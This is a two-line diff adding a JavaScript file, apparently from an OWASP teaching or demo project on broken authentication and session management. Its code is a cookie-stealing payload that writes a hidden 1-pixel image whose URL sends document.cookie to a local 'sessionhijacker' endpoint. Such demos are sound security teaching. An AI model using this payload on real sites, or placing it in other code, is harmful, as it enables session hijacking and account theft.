@@ -1,0 +1,2 @@
+﻿//OWASP #2 broken authentication and session management
+document.write("<img style='width:1px; height:1px;' src='https://localhost:44397/sessionhijacker/?cookie=" + encodeURIComponent(document.cookie) + "'>");
